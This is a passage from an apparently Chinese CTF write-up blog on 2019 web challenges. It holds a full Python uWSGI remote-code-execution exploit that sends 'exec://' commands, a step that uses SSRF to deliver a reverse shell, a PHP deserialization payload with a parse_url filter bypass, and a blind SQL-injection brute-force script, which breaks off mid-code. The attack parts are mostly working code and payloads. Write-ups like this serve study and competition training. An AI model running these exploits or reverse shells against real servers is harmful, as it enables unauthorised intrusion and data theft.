class="keyword">if</span> isinstance(x, int) <span class="keyword">else</span> len(x))[2:].rjust(4, <span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">if</span> sys.version_info[0] == 3: import bytes</span><br><span class="line">    s = bytes.fromhex(s) <span class="keyword">if</span> sys.version_info[0] == 3 <span class="keyword">else</span> s.decode(<span class="string">'hex'</span>)</span><br><span class="line">    return s[::-1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pack_uwsgi_vars(var):</span><br><span class="line">    pk = b<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> var.items() <span class="keyword">if</span> hasattr(var, <span class="string">'items'</span>) <span class="keyword">else</span> var:</span><br><span class="line">        pk += sz(k) + k.encode(<span class="string">'utf8'</span>) + sz(v) + v.encode(<span class="string">'utf8'</span>)</span><br><span class="line">    result = b<span class="string">'\x00'</span> + sz(pk) + b<span class="string">'\x00'</span> + pk</span><br><span class="line">    # <span class="builtin-name">print</span>(urlencode(result))</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def parse_addr(addr, <span class="attribute">default_port</span>=None):</span><br><span class="line">   <span class="built_in"> port </span>= default_port</span><br><span class="line">    <span class="keyword">if</span> isinstance(addr, str):</span><br><span class="line">        <span class="keyword">if</span> addr.isdigit():</span><br><span class="line">            addr,<span class="built_in"> port </span>= <span class="string">''</span>, addr</span><br><span class="line">        elif <span class="string">':'</span> <span class="keyword">in</span> addr:</span><br><span class="line">            addr, _,<span class="built_in"> port </span>= addr.partition(<span class="string">':'</span>)</span><br><span class="line">    elif isinstance(addr, (list, tuple, set)):</span><br><span class="line">        addr,<span class="built_in"> port </span>= addr</span><br><span class="line">   <span class="built_in"> port </span>= int(port) <span class="keyword">if</span><span class="built_in"> port </span><span class="keyword">else</span> port</span><br><span class="line">    return (addr <span class="keyword">or</span> <span class="string">'127.0.0.1'</span>, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_host_from_url(url):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'//'</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = url.split(<span class="string">'//'</span>, 1)[1]</span><br><span class="line">    host, _, url = url.partition(<span class="string">'/'</span>)</span><br><span class="line">    return (host, <span class="string">'/'</span> + url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fetch_data(uri, <span class="attribute">payload</span>=None, <span class="attribute">body</span>=None):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'http'</span> <span class="keyword">not</span> <span class="keyword">in</span> uri:</span><br><span class="line">        uri = <span class="string">'http://'</span> + uri</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    # s.headers[<span class="string">'UWSGI_FILE'</span>] = payload</span><br><span class="line">    <span class="keyword">if</span> body:</span><br><span class="line">        import urlparse</span><br><span class="line">        body_d = dict(urlparse.parse_qsl(urlparse.urlsplit(body).path))</span><br><span class="line">        d = s.post(uri, <span class="attribute">data</span>=body_d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        d = s.<span class="builtin-name">get</span>(uri)</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">        <span class="string">'code'</span>: d.status_code,</span><br><span class="line">        <span class="string">'text'</span>: d.text,</span><br><span class="line">        <span class="string">'header'</span>: d.headers</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ask_uwsgi(addr_and_port, mode, var, <span class="attribute">body</span>=<span class="string">''</span>):</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">'tcp'</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect(parse_addr(addr_and_port))</span><br><span class="line">    elif mode == <span class="string">'unix'</span>:</span><br><span class="line">        s = socket.socket(socket.AF_UNIX)</span><br><span class="line">        s.connect(addr_and_port)</span><br><span class="line">    tmp = (pack_uwsgi_vars(var) + body.encode(<span class="string">'utf8'</span>))</span><br><span class="line">    <span class="attribute">tmp</span>=urllib.quote(tmp)</span><br><span class="line">    <span class="builtin-name">print</span>(tmp)</span><br><span class="line">    s.send(pack_uwsgi_vars(var) + body.encode(<span class="string">'utf8'</span>))</span><br><span class="line">    response = []</span><br><span class="line">    # Actually we dont need the response, it will block <span class="keyword">if</span> we <span class="builtin-name">run</span> any commands.</span><br><span class="line">    # So I comment all the receiving stuff. </span><br><span class="line">    # <span class="keyword">while</span> 1:</span><br><span class="line">    #     data = s.recv(4096)</span><br><span class="line">    #     <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">    #         break</span><br><span class="line">    #     response.append(data)</span><br><span class="line">    s.close()</span><br><span class="line">    return b<span class="string">''</span>.join(response).decode(<span class="string">'utf8'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def curl(mode, addr_and_port, payload, target_url):</span><br><span class="line">    host, uri = get_host_from_url(target_url)</span><br><span class="line">    path, _, qs = uri.partition(<span class="string">'?'</span>)</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">'http'</span>:</span><br><span class="line">        return fetch_data(addr_and_port+uri, payload)</span><br><span class="line">    elif mode == <span class="string">'tcp'</span>:</span><br><span class="line">        host = host <span class="keyword">or</span> parse_addr(addr_and_port)[0]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host = addr_and_port</span><br><span class="line">    var = &#123;</span><br><span class="line">        <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span>,</span><br><span class="line">        <span class="string">'REQUEST_METHOD'</span>: <span class="string">'GET'</span>,</span><br><span class="line">        <span class="string">'PATH_INFO'</span>: path,</span><br><span class="line">        <span class="string">'REQUEST_URI'</span>: uri,</span><br><span class="line">        <span class="string">'QUERY_STRING'</span>: qs,</span><br><span class="line">        <span class="string">'SERVER_NAME'</span>: host,</span><br><span class="line">        <span class="string">'HTTP_HOST'</span>: host,</span><br><span class="line">        <span class="string">'UWSGI_FILE'</span>: payload,</span><br><span class="line">        <span class="string">'SCRIPT_NAME'</span>: target_url</span><br><span class="line">    &#125;</span><br><span class="line">    return ask_uwsgi(addr_and_port, mode, var)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main(<span class="number">*a</span>rgs):</span><br><span class="line">    desc = <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">    This is a uwsgi client &amp; RCE exploit.</span></span><br><span class="line"><span class="string">    Last modifid at 2018-01-30 by wofeiwo@80sec.com</span></span><br><span class="line"><span class="string">    "</span><span class="string">""</span></span><br><span class="line">    elog = <span class="string">"Example：uwsgi_exp.py -u 1.2.3.4:5000 -c \"echo 111&gt;/tmp/abc\""</span></span><br><span class="line">    </span><br><span class="line">    parser = argparse.ArgumentParser(<span class="attribute">description</span>=desc, <span class="attribute">epilog</span>=elog)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">'-m'</span>, <span class="string">'--mode'</span>, <span class="attribute">nargs</span>=<span class="string">'?'</span>, <span class="attribute">default</span>=<span class="string">'tcp'</span>,</span><br><span class="line">                        <span class="attribute">help</span>=<span class="string">'Uwsgi mode: 1. http 2. tcp 3. unix. The default is tcp.'</span>,</span><br><span class="line">                        <span class="attribute">dest</span>=<span class="string">'mode'</span>, choices=[<span class="string">'http'</span>, <span class="string">'tcp'</span>, <span class="string">'unix'</span>])</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">'-u'</span>, <span class="string">'--uwsgi'</span>, <span class="attribute">nargs</span>=<span class="string">'?'</span>, <span class="attribute">required</span>=<span class="literal">True</span>,</span><br><span class="line">                        <span class="attribute">help</span>=<span class="string">'Uwsgi server: 1.2.3.4:5000 or /tmp/uwsgi.sock'</span>,</span><br><span class="line">                        <span class="attribute">dest</span>=<span class="string">'uwsgi_addr'</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--command'</span>, <span class="attribute">nargs</span>=<span class="string">'?'</span>, <span class="attribute">required</span>=<span class="literal">True</span>,</span><br><span class="line">                        <span class="attribute">help</span>=<span class="string">'Command: The exploit command you want to execute, must have this.'</span>,</span><br><span class="line">                        <span class="attribute">dest</span>=<span class="string">'command'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; 2:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        return</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.mode.lower() == <span class="string">"http"</span>:</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"[-]Currently only tcp/unix method is supported in RCE exploit."</span>)</span><br><span class="line">        return</span><br><span class="line">    payload = <span class="string">'exec://'</span> + args.command + <span class="string">"; echo test"</span> # must have someting <span class="keyword">in</span> output <span class="keyword">or</span> the uWSGI crashs.</span><br><span class="line">    # <span class="builtin-name">print</span>(payload)</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">"[*]Sending payload."</span>)</span><br><span class="line">    <span class="builtin-name">print</span> payload</span><br><span class="line">    <span class="builtin-name">print</span>(curl(args.mode.lower(), args.uwsgi_addr, payload, <span class="string">'/testapp'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>打印出gohper，通过ssrf用python的反弹shell操作打一波3031端口就好了，就可以拿到shell（继续盗bertram图）<br><img src="/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/8418106-a4b2af8b04d85f1d.jpg" alt title="图片"><br><img src="http://upload-images.jianshu.io/upload_images/8418106-914eeb834f1b33b6?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>提示有socks代理，扫一波发现172.16.17.4有1080端口，所以做个代理就好了，师傅们都用ew的，这个就不介绍了，转发出来了就直接用公网打就好了，并且官方最后公布了内网服务的源码，其实在内网的时候有着各个师傅们搭好的路，直接抄作业就好了，2333，执行流程应该是是（改bertram表述），构造反序列化payload<br>User 1 -&gt; POST /adduser username=payload&amp;password=<br>User 1 -&gt; /savelog 修改 User2 session<br>User 2 -&gt; 登录触发反序列化<br>User 2 -&gt; getflag<br>（最后的我没测，打完就跑路了，被自己菜哭了）</p>
<h3 id="0x07-babywp"><a href="#0x07-babywp" class="headerlink" title="0x07 babywp"></a>0x07 babywp</h3><p>webpwn，果断放弃，看官方WP就好了</p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>SQL</tag>
        <tag>反序列化</tag>
        <tag>uwsgi</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 全国大学生信息安全竞赛创新能力实践赛3道Web Writeup</title>
    <url>/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/</url>
    <content><![CDATA[<h3 id="0x01-JustSoso"><a href="#0x01-JustSoso" class="headerlink" title="0x01 JustSoso"></a>0x01 JustSoso</h3><p>本题的主要知识点在于反序列化的应用和parse_url()函数的解析问题，首先通过网页源码中的文件读取提示读取得到index.php文件源码和hint文件源码，任意文件读取就不做介绍了。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">#index.php</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>); </span></span><br><span class="line"><span class="php">$file = $_GET[<span class="string">"file"</span>]; </span></span><br><span class="line"><span class="php">$payload = $_GET[<span class="string">"payload"</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">@<span class="keyword">include</span>($file);</span></span><br><span class="line"><span class="php">print_r($payload);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span></span><br><span class="line"><span class="php">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span></span><br><span class="line"><span class="php">    parse_str($url[<span class="string">'query'</span>],$query);</span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123; </span></span><br><span class="line"><span class="php">    	    <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span></span><br><span class="line"><span class="php">    	    <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $payload = unserialize($payload);</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123; </span></span><br><span class="line"><span class="php">   <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>; </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">&lt;!--Please test index.php?file=xxx.php --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Please get the source of hint.php--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#hint.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $handle;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在index.php中的反序列化函数unserialize()加上hint.php文件，很显然是通过反序列化的方式来读取flag.php文件，先不看unserialize()前的过滤规则，对hint.php进行序列化构造。而在hint.php文件中，主要触发echo @highlight_file($this-&gt;file, true)，而触发要解决的主要是 $this-&gt;token == $this-&gt;token_flag的问题，实例化Handle后，$handle是可控的，并且类Handle中的魔术方法__destruct会触发Flag类中的getFlag()函数所以我们只需要利用$handle来给Flag类中的变量赋值即可。而对于token和token_flag值的比较，可以采用引用的方法进行绕过，即$this-&gt;token = &amp;$this-&gt;token_flag;所以最终构造为：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $handle;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">foreach</span> (get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;handle = $handle;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $token;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $token_flag;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;file = $file;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>);</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$Flag = <span class="keyword">new</span> Flag();</span></span><br><span class="line"><span class="php">$Flag-&gt;file = <span class="string">"flag.php"</span>;</span></span><br><span class="line"><span class="php">$Flag-&gt;token = &amp;$Flag-&gt;token_flag;</span></span><br><span class="line"><span class="php">$test = <span class="keyword">new</span> Handle($Flag);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> urlencode(serialize($test));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>生成序列化数据，由于序列化后有不可见字符，所以利用urlencode函数进行编码输出为</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">O%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>Handle%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Handle%<span class="number">00</span>handle%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Flag%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22f</span>ile%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22f</span>lag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>token%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A32%<span class="number">3</span>A%<span class="number">2262e7f</span>2e090fe150ef8deb4466fdc81b3%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>token_flag%<span class="number">22</span>%<span class="number">3</span>BR%<span class="number">3</span>A4%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
<p>本地测试成功后，接下来就是绕过index.php文件中的过滤代码：</p>
<p><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-fd7dd48f508be3a5.png" alt></p>
<p>取出域名后完整地址路劲传递给变量%url,其实也就是只要参数中，即序列化数据中存在flag字符就die了，这里利用parse_url函数的解析特性，即利用’///’进行绕过$url过滤，parse_url函数解析’///‘时会返回false，从而可以直接绕过过滤规则，最后在绕一下__wakeup函数就好了，最终payload为：<a href="http://84e854e3a8db40e29b9958ff3e816a31f8a75c76067c4667.changame.ichunqiu.com///?file=hint.php&amp;payload=O%3A6%3A%22Handle%22%3A2%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%2264d52e08cc03e6090bc1ef30b73ccb85%22%3Bs%3A10%3A%22token_flag%22%3BR%3A4%3B%7D%7D" target="_blank" rel="noopener">http://84e854e3a8db40e29b9958ff3e816a31f8a75c76067c4667.changame.ichunqiu.com///?file=hint.php&amp;payload=O%3A6%3A%22Handle%22%3A2%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%2264d52e08cc03e6090bc1ef30b73ccb85%22%3Bs%3A10%3A%22token_flag%22%3BR%3A4%3B%7D%7D</a></p>
<p><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-6aae6fdb89c927a4.png" alt></p>
<p><strong>FLAG值：</strong>flag{7e4d5d48-44a9-4a91-b6aa-bd6b659d1bde}</p>
<h3 id="0x02-全宇宙最简单的SQL"><a href="#0x02-全宇宙最简单的SQL" class="headerlink" title="0x02 全宇宙最简单的SQL"></a>0x02 全宇宙最简单的SQL</h3><p>既然是SQL注入，那么首先肯定是先查看注入点，fuzz发现过滤or、if等，并且能够判断当我们输入的payload能够拼接出的SQL语句执行成功时，网页返回的是“登陆失败”，而当拼接出的SQL语句执行错误时，网页返回“数据库操作失败”<br>所以，使用pow函数以及&amp;&amp;构造sql语句进行判断</p>
<blockquote>
<p>a’ &amp;&amp; 1=1 &amp;&amp; pow(9.99999999)<br>a’ &amp;&amp; 1=2 &amp;&amp; pow(9.99999999)</p>
</blockquote>
<p>当前面的判断条件为假时，数据库就不会执行后面的pow函数，否则就会执行，当pow参数为pow（9,99999999）时，就会因为数字过大而报错，于是利用这一点构造注入语句对数据库名进行暴破<br><img src="/2019/04/23/2019-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E8%83%BD%E5%8A%9B%E5%AE%9E%E8%B7%B5%E8%B5%9B3%E9%81%93Web-Writeup/8418106-425c3dd250d095c4.png" alt></p>
<p>得到的数据库名为ctf，然后由于or被过滤，无法查看information_schema，但是可以猜出表名为user，测试后确定用户名为admin，所以既然不能够直接爆出flag那就暴破出密码登入进行查看，构造脚本进行爆破</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">result = ''</span><br><span class="line">url = 'http://728b6208b313404eba7b7712cc1c3aa203c6e16dcc7a4425.changame.ichunqiu.com/'</span><br><span class="line"><span class="comment">#payload = 'no=1 or if((ascii(substr((&#123;sql&#125;),&#123;list&#125;,1))=&#123;num&#125;),1,0)'</span></span><br><span class="line"><span class="comment">#payload = '''a' and ascii(mid(&#123;sql&#125;,&#123;list&#125;,1))=&#123;num&#125; and pow(9,9999999999)#'''</span></span><br><span class="line">payload = "a' &amp;&amp; (<span class="keyword">select</span> * <span class="keyword">from</span> ctf.user <span class="keyword">limit</span> <span class="number">1</span>) &gt; (<span class="string">'admin'</span>,<span class="string">'&#123;password&#125;'</span>) &amp;&amp; <span class="keyword">pow</span>(<span class="number">9</span>,<span class="number">9999999999</span>)<span class="comment">#"</span></span><br><span class="line"><span class="comment">#cookies = &#123;'PHPSESSID':'15lkeifat78j9p81p7k0igq7n2'&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">password</span> = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        <span class="comment">#hh = payload.format(sql='database()',list=str(i),num=str(j)) #ctf</span></span><br><span class="line">        hh = payload.format(<span class="keyword">password</span> = <span class="keyword">str</span>(<span class="keyword">password</span> + <span class="keyword">chr</span>(j))) <span class="comment">#ctf</span></span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select count(*) from information_schema.tables',list=str(i),num=str(j))</span></span><br><span class="line">        <span class="comment">#hh = payload.format(sql="select table_name from information_schema.tables where table_schema='ctf'",list=str(i),num=str(j))</span></span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select * from ctf.f14g',list=str(i),num=str(j))</span></span><br><span class="line">        print hh</span><br><span class="line">        <span class="keyword">data</span> = &#123;<span class="string">'username'</span>:hh,<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</span><br><span class="line">        <span class="comment">#print hh</span></span><br><span class="line">        try:</span><br><span class="line">            zz = requests.post(<span class="keyword">url</span>,<span class="keyword">data</span>=<span class="keyword">data</span>)</span><br><span class="line">            <span class="comment">#print zz.content</span></span><br><span class="line">            